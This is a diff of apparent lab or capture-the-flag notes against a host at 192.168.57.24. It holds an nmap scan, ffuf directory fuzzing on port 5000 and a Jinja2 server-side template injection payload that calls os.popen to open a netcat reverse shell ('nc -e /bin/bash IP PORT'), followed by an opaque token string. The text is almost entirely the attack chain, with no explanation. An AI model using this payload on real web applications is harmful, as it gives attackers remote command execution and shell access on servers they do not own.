@@ -5,7 +5,8 @@
 
 sudo nmap -sC 192.168.57.24 -A -v -p-
 
-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:5000/FUZZ-fs 3806
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:
+5000/FUZZ-fs 3806
 
 {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}
 
@@ -14,23 +15,9 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://
 
 ```
 sudo nmap -sC 192.168.57.24 -A -v -p-
-```
-
-
-
-```
-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:5000/FUZZ-fs 3806
-```
-
-
-
-```
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:
+5000/FUZZ-fs 3806
 {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}
-```
-
-
-
-```
 22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4
 ```
 
